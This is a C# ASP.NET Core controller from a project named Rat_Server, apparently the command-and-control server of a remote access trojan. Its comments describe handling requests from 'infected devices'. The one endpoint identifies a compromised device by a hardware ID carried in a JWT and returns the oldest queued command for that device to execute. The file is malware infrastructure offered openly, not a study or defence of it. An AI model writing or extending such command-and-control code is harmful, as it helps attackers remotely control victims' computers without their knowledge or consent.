using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Rat_Server.Model.Entities;
using Rat_Server.Model.DTOs;
using Rat_Server.Model.Context;
using System.Linq.Expressions;
using Rat_Server.Model.Services;

namespace Rat_Server.Controllers
{
    /// <summary>
    /// This Controller is responsible for handling requests that are related to the infected devices.
    /// This does not include requests that require admin permissions. Those can be found in the AdminController.
    /// </summary>
    [Route("api/[controller]")]
    [ApiController]
    public class DeviceController : ControllerBase
    {
        private readonly RatDbContext _context;
        private readonly IConfiguration _config;
        private readonly JwtService _jwtService;

        public DeviceController(RatDbContext context, IConfiguration config)
        {
            _context = context;
            _config = config;
            _jwtService = new JwtService(config);
        }

        [HttpGet("GetCurrentCommand")]
        [ProducesResponseType(typeof(DeviceCommandDto), StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status204NoContent)]
        public ActionResult<DeviceCommandDto> GetCurrentCommand([FromHeader] string Authorization)
        {
            Guid Hwid = new Guid(_jwtService.ParseAuthorizationHeader(Authorization));

            // Retrieve the list of commands for the device and order them by the date they were added
            List<Command> commands = _context.Commands.Where(c => c.Device.Hwid == Hwid).OrderBy(c => c.DateAdded).ToList();
            
            if(commands.Any())
            {
                // The first element of the list is the current command the device needs to execute
                Command command = commands.First();

                return Ok(new DeviceCommandDto {
                    commandId = command.commandId.ToString(),
                    CommandValue = command.CommandValue
                });
            }
            else
            {
                return NoContent();
            }
        }
    }
}
